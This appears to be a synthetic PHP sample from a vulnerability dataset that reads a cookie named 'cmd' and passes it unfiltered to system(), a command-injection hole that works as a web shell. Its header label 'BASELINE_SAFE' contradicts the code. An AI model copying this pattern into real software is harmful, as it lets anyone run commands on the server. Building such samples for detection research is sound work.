<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=COOKIE; CE_MODE=FILTER_INPUT_COOKIE; SKELETON=S0; KEY=cmd; SINK=B1; VAR=v0042 */
function SINK_B1($command){
    system($command);
}
$inp = (string)(filter_input(INPUT_COOKIE, "cmd") ?? "");
$inp = (string)$inp; // no value processing
$out = SINK_B1($inp);
echo (string)($out);
?>
